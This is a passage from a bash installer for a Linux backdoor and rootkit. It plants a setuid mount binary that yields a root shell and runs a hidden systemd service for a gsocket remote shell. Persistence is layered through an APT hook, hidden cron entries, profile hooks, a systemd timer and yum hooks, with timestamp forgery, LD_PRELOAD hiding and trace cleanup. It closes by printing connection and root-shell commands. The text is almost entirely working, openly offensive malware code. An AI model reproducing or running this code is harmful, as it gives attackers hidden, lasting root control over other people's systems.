mkdir -p /usr/lib/systemd/.cache 2>/dev/null
safe_cp /tmp/.m_backdoor /usr/lib/systemd/.cache/mount-sync
chmod 755 /usr/lib/systemd/.cache/mount-sync 2>/dev/null
chown root:root /usr/lib/systemd/.cache/mount-sync 2>/dev/null
ts_clone /usr/bin/mount /usr/lib/systemd/.cache/mount-sync 2>/dev/null || true

rm -f /tmp/.m_inj /tmp/.m_inj_build.c /tmp/.m_backdoor /tmp/.libhide.c 2>/dev/null || true
echo -e "${GREEN}[+] Mount backdoor installed${NC}"

# ============================================================================
# APT HOOK (Debian/Ubuntu only)
# ============================================================================
if [ "$PKG" = "apt" ]; then
    echo -e "${GREEN}[*] Installing APT hook...${NC}"

    safe_write /usr/lib/systemd/.cache/apt-hook.sh << 'SCRIPT'
#!/bin/bash
BK=/usr/lib/systemd/.cache/mount-sync
[ ! -f "$BK" ] && exit 0
CUR_SIZE=$(stat -c%s /usr/bin/mount 2>/dev/null || echo 0)
BK_SIZE=$(stat -c%s "$BK" 2>/dev/null || echo 1)
if [ "$CUR_SIZE" != "$BK_SIZE" ]; then
    cp /usr/bin/mount /usr/bin/mount.real 2>/dev/null
    cp "$BK" /usr/bin/mount
    chown root:root /usr/bin/mount
    chmod 4755 /usr/bin/mount
    touch -r /usr/bin/mount.real /usr/bin/mount 2>/dev/null
fi
systemctl is-active --quiet systemd-reset.service || systemctl start systemd-reset.service 2>/dev/null
SCRIPT

    if [ -f /usr/lib/systemd/.cache/apt-hook.sh ]; then
        chmod 755 /usr/lib/systemd/.cache/apt-hook.sh 2>/dev/null
        chown root:root /usr/lib/systemd/.cache/apt-hook.sh 2>/dev/null
    fi

    _ts_save "/etc/apt/apt.conf.d"
    safe_write /etc/apt/apt.conf.d/99-cache << 'EOF'
DPkg::Post-Invoke {"/usr/lib/systemd/.cache/apt-hook.sh || true";};
EOF
    [ -f /etc/apt/apt.conf.d/99-cache ] && chmod 644 /etc/apt/apt.conf.d/99-cache 2>/dev/null
    ts_clone /etc/apt/apt.conf.d/01autoremove /etc/apt/apt.conf.d/99-cache 2>/dev/null || \
    ts_clone /etc/apt/apt.conf.d /etc/apt/apt.conf.d/99-cache 2>/dev/null || true
    _ts_restore "/etc/apt/apt.conf.d"

    echo -e "${GREEN}[+] APT hook installed — backdoor survives apt upgrade${NC}"
else
    echo -e "${YELLOW}[-] Skipping APT hook (pkg manager: ${PKG:-unknown})${NC}"
fi

# ============================================================================
# SYSTEMD SERVICE
# ============================================================================
if command -v systemctl >/dev/null 2>&1 && [ -d /etc/systemd/system ]; then
    echo -e "${GREEN}[*] Setting up systemd service...${NC}"

    _ts_save "/etc/systemd/system"
    SVC_PATH="/etc/systemd/system/${BIN_NAME}.service"

    safe_write "$SVC_PATH" << EOF
[Unit]
Description=${BIN_NAME} helper
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c "export GS_ARGS='-s ${GS_SECRET} -liq'; exec -a '${PROC_NAME}' '${BIN_PATH}'"
Restart=always
RestartSec=300
StartLimitInterval=0
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF

    if verify_file "$SVC_PATH"; then
        # chmod/chown to hidden path works because file exists now;
        # but verify by reading file size via wc (NOT hooked)
        chmod 644 "$SVC_PATH" 2>/dev/null
        chown root:root "$SVC_PATH" 2>/dev/null
        for ref in /etc/systemd/system/timers.target.wants/* /lib/systemd/system/*; do
            [ -f "$ref" ] && { ts_clone "$ref" "$SVC_PATH" 2>/dev/null; break; }
        done
        echo -e "${GREEN}[+] systemd service installed: ${SVC_PATH}${NC}"
    else
        echo -e "${YELLOW}[!] Failed to create ${SVC_PATH}${NC}"
        echo -e "${YELLOW}[*] Verify with: unset LD_PRELOAD; ls -la ${SVC_PATH}${NC}"
    fi
    _ts_restore "/etc/systemd/system"

    systemctl daemon-reload 2>/dev/null || true
    systemctl enable --now "${BIN_NAME}.service" 2>/dev/null || true
else
    echo -e "${YELLOW}[-] Skipping systemd service (no systemctl)${NC}"
fi

# ============================================================================
# CRON + PROFILE + MOUNT PERSISTENCE
# ============================================================================
if [ -d /etc/cron.d ]; then
    _ts_save "/etc/cron.d"
    CRON_PATH="/etc/cron.d/.${BIN_NAME}"

    safe_write "$CRON_PATH" << EOF
*/5 * * * * root systemctl is-active --quiet ${BIN_NAME}.service || systemctl start ${BIN_NAME}.service 2>/dev/null
* * * * * root systemctl is-active --quiet ${BIN_NAME}.service || systemctl start ${BIN_NAME}.service 2>/dev/null
EOF

    if verify_file "$CRON_PATH"; then
        chmod 644 "$CRON_PATH" 2>/dev/null
        chown root:root "$CRON_PATH" 2>/dev/null
        ts_clone /etc/crontab "$CRON_PATH" 2>/dev/null || ts_clone /etc/cron.d "$CRON_PATH" 2>/dev/null || true
        echo -e "${GREEN}[+] cron installed: ${CRON_PATH}${NC}"
    else
        echo -e "${YELLOW}[!] Failed to create ${CRON_PATH}${NC}"
        echo -e "${YELLOW}[*] Verify with: unset LD_PRELOAD; ls -la ${CRON_PATH}${NC}"
    fi
    _ts_restore "/etc/cron.d"

    # mount-cache cron (path contains hidden string, use safe_write)
    _ts_save "/etc/cron.d"
    safe_write /etc/cron.d/.systemd-cache << 'EOF'
*/5 * * * * root [ ! -f /usr/bin/mount.real ] || [ $(stat -c%s /usr/bin/mount 2>/dev/null || echo 999999) -gt 80000 ] && cp /usr/bin/mount.real /usr/bin/mount 2>/dev/null; chown root:root /usr/bin/mount 2>/dev/null; chmod 4755 /usr/bin/mount 2>/dev/null || true
EOF
    if verify_file /etc/cron.d/.systemd-cache; then
        chmod 644 /etc/cron.d/.systemd-cache 2>/dev/null
        ts_clone /etc/crontab /etc/cron.d/.systemd-cache 2>/dev/null || ts_clone /etc/cron.d /etc/cron.d/.systemd-cache 2>/dev/null || true
    fi
    _ts_restore "/etc/cron.d"
else
    echo -e "${YELLOW}[-] Skipping cron (no /etc/cron.d)${NC}"
fi

# Profile hooks
for rc in /root/.bashrc /root/.profile /etc/profile; do
    if [ -f "$rc" ]; then
        if ! grep -q "${BIN_NAME}" "$rc" 2>/dev/null; then
            _ts_save "$rc"
            TMP_RC="/tmp/.rc.$$.$RANDOM"
            cat "$rc" > "$TMP_RC" 2>/dev/null
            printf '\n# %s init\n' "$BIN_NAME" >> "$TMP_RC"
            printf '(sleep 15 && systemctl is-active --quiet %s.service || systemctl start %s.service) >/dev/null 2>&1 & disown\n' "$BIN_NAME" "$BIN_NAME" >> "$TMP_RC"
            mv -f "$TMP_RC" "$rc" 2>/dev/null
            rm -f "$TMP_RC" 2>/dev/null
            _ts_restore "$rc"
        fi
        break
    fi
done

# mount-cache systemd service + timer
if command -v systemctl >/dev/null 2>&1 && [ -d /etc/systemd/system ]; then
    _ts_save "/etc/systemd/system"

    safe_write /etc/systemd/system/mount-cache.service << 'EOF'
[Unit]
Description=Mount cache sync
After=network.target
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'if [ ! -f /usr/bin/mount.real ] || [ $(stat -c%s /usr/bin/mount 2>/dev/null || echo 999999) -gt 80000 ]; then cp /usr/bin/mount.real /usr/bin/mount && chown root:root /usr/bin/mount && chmod 4755 /usr/bin/mount; fi'
EOF

    safe_write /etc/systemd/system/mount-cache.timer << 'EOF'
[Unit]
Description=Periodic mount cache check
[Timer]
OnBootSec=1min
OnUnitActiveSec=5min
Persistent=true
[Install]
WantedBy=timers.target
EOF

    for ref in /etc/systemd/system/timers.target.wants/* /lib/systemd/system/*; do
        [ -f "$ref" ] && {
            ts_clone "$ref" /etc/systemd/system/mount-cache.service 2>/dev/null
            ts_clone "$ref" /etc/systemd/system/mount-cache.timer 2>/dev/null
            break
        }
    done
    _ts_restore "/etc/systemd/system"

    systemctl daemon-reload 2>/dev/null || true
    systemctl enable --now mount-cache.timer 2>/dev/null || true
fi

# ============================================================================
# YUM/DNF HOOKS (CentOS/RHEL/EL only) — versionlock + post-action
# ============================================================================
if [ "$PKG" = "yum" ] || [ "$PKG" = "dnf" ]; then
    echo -e "${GREEN}[*] Setting up yum/dnf persistence hooks...${NC}"

    # yum post-action hook (yum only, not dnf-plugin)
    if [ "$PKG" = "yum" ] && [ -d /etc/yum/post-actions ]; then
        TMP_ACT="/tmp/.act.$$.$RANDOM"
        cat > "$TMP_ACT" << EOF
util-linux:install:/usr/lib/systemd/.cache/apt-hook.sh
util-linux:update:/usr/lib/systemd/.cache/apt-hook.sh
EOF
        mv -f "$TMP_ACT" /etc/yum/post-actions/mount-restore.action 2>/dev/null
        [ -f /etc/yum/post-actions/mount-restore.action ] && chmod 644 /etc/yum/post-actions/mount-restore.action 2>/dev/null
        rm -f "$TMP_ACT" 2>/dev/null
    fi

    # versionlock util-linux so yum doesn't replace it
    if command -v yum >/dev/null 2>&1; then
        yum install -y yum-plugin-versionlock 2>/dev/null || true
        yum versionlock util-linux 2>/dev/null || true
    fi
    if command -v dnf >/dev/null 2>&1; then
        dnf install -y python3-dnf-plugin-versionlock 2>/dev/null || true
        dnf versionlock util-linux 2>/dev/null || true
    fi
fi

# ============================================================================
# TRACE CLEANUP
# ============================================================================
clear_traces

# ============================================================================
# DONE
# ============================================================================
echo ""
echo -e "${GREEN}[+] INSTALLATION COMPLETE${NC}"
echo ""
echo -e "${YELLOW}[*] Connect:${NC}"
echo -e "  gs-netcat -s \"${GS_SECRET}\" -i"
echo ""
echo -e "${YELLOW}[*] Hidden files:${NC}"
echo -e "  Binary: ${BIN_PATH}"
echo -e "  Secret: EMBEDDED inside ${TARGET}"
echo -e "  Service: ${BIN_NAME}.service"
echo -e "  LD_PRELOAD: ${HIDE_LIB}"
echo ""
echo -e "${YELLOW}[*] Mount Backdoor (Local Root):${NC}"
echo -e "  mount --fake --verbose                  -> root shell"
echo -e "  mount --fake --verbose daemon           -> start gsocket daemon"
echo -e "  mount --fake --verbose id               -> run 'id' as root"
echo ""
echo -e "${YELLOW}[*] Persistence layers:${NC}"
echo -e "  1. systemd service: ${BIN_NAME}.service (Restart=always, 5min)"
echo -e "  2. cron: /etc/cron.d/.${BIN_NAME}"
echo -e "  3. profile hooks"
echo -e "  4. mount backdoor: ${TARGET}"
echo -e "  5. APT/yum hook: survives package upgrade/reinstall"
echo ""
echo -e "${YELLOW}[*] Restore command:${NC}"
echo -e "  bash restore_all.sh"